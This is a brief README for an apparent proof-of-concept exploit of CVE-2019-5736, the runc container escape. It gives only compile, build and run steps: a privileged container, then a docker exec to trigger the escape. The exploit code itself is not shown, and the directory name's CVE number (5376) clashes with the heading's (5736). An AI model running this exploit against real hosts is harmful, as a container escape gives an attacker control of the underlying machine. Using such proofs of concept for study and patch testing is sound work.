### Exploit for CVE-2019-5736 

## Usage: 

* build image

		cd CVE-2019-5376-POC
		gcc run.c -o run -static
		docker build -t testpoc .


* run

		docker run -it --privileged --name testpoc_instance testpoc
		
		# open another terminal, and run docker exec
		docker exec -it testpoc_instance bash
